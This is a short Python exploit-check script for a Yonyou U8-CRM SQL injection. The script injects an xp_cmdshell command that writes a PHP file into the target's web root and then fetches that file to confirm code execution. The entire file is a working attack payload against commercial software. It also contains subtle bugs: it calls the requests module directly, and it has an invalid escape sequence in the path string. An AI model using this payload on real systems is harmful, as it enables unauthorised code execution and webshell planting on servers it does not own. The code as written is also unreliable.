import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友U8-CRM系统接口reservationcomplete.php存在SQL注入漏洞(RCE)',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)',
        'Connection':'close'
    }
    vurl = urllib.parse.urljoin(url, "/bgt/reservationcomplete.php?DontCheckLogin=1&ID=1112;exec%20master..xp_cmdshell%20%27echo%20^%3C?php%20echo%20hello;?^%3E%20%3E%20D:\U8SOFT\turbocrm70\code\www\helloadmin.php%27;")
    try:
        response = requests(vurl, headers=headers)
        if response.status_code == 200:
            rurl = url + '/helloadmin.php'
            response = requests.get(rurl)
            if response.status_code == 200 and 'hello' in response.text:
                relsult['vulnerable'] = True
                relsult['verify'] = vurl
        return relsult

    except:
        return relsult